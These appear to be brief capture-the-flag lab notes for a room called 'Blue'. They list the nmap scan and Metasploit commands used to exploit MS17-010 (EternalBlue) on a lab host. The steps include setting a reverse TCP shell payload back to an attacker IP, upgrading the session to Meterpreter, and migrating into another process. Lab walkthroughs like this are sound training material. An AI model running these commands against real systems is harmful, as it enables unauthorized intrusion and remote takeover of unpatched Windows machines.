### Blue ###

nmap 10.10.203.101 -Pn -sVC --script vuln
* Vulnerability: smb-vuln-ms17-010

ls /usr/share/nmap/scripts | grep "ms17-010"

msfconsole

search exploit ms17-010

use exploit/windows/smb/ms17_010_eternalblue

set rhosts 10.10.203.101

set lhost 10.9.189.41

set payload windows/x64/shell/reverse_tcp

run

CTRL + Z


search shell_to_meterpreter

use post/multi/manage/shell_to_meterpreter

set LhosT 10.9.189.41

set session 1

run


** Post-module execution completed

sessions 1

whoami

shell

ps

migrate PROCESS_ID


